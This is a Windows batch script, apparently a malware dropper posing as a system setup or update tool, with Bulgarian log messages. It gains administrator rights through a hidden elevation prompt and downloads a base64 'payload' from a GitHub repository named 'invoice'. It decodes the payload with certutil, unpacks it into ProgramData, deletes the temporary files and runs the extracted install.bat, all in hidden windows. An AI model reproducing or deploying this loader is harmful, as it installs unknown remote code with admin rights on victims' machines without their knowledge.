@echo off
chcp 65001 >nul
cd /d "%~dp0"
set "TARGET_DIR=C:\ProgramData\MySystemSetup"
set "LOG_FILE=%TARGET_DIR%\install_log.txt"
set "TEMP_ZIP=%TEMP%\update_%RANDOM%.zip"
set "TEMP_B64=%TEMP%\payload_%RANDOM%.b64"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" >nul 2>&1

echo =================================================== >> "%LOG_FILE%"
echo [+] Начало: %date% %time% >> "%LOG_FILE%"

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Нужни са админ права. Пренасочване... >> "%LOG_FILE%"
    powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

echo [+] Админ права OK. >> "%LOG_FILE%"

echo [+] Сваляне на payload.b64... >> "%LOG_FILE%"
powershell -NoProfile -WindowStyle Hidden -Command ^
    "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Chupacabra-creator/invoice/main/payload.b64' -OutFile '%TEMP_B64%' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }"

if not exist "%TEMP_B64%" (
    echo [!] Грешка при сваляне на payload.b64 >> "%LOG_FILE%"
    exit /b 1
)

echo [+] Декодиране... >> "%LOG_FILE%"
certutil -decode "%TEMP_B64%" "%TEMP_ZIP%" >nul 2>&1
if not exist "%TEMP_ZIP%" (
    echo [!] Грешка при decode >> "%LOG_FILE%"
    exit /b 1
)

echo [+] Разархивиране с PowerShell... >> "%LOG_FILE%"
powershell -NoProfile -WindowStyle Hidden -Command ^
    "try { " ^
    "Add-Type -AssemblyName System.IO.Compression.FileSystem; " ^
    "[System.IO.Compression.ZipFile]::ExtractToDirectory('%TEMP_ZIP%', '%TARGET_DIR%', $true); " ^
    "} catch { " ^
    "Expand-Archive -LiteralPath '%TEMP_ZIP%' -DestinationPath '%TARGET_DIR%' -Force -ErrorAction Stop " ^
    "}"

del "%TEMP_B64%" >nul 2>&1
del "%TEMP_ZIP%" >nul 2>&1

cd /d "%TARGET_DIR%"
dir /b >> "%LOG_FILE%"

if exist "install.bat" (
    echo [+] Стартиране на install.bat... >> "%LOG_FILE%"
    call "install.bat" >> "%LOG_FILE%" 2>&1
) else (
    echo [!] install.bat все още не е намерен. >> "%LOG_FILE%"
)

echo =================================================== >> "%LOG_FILE%"
exit /b 0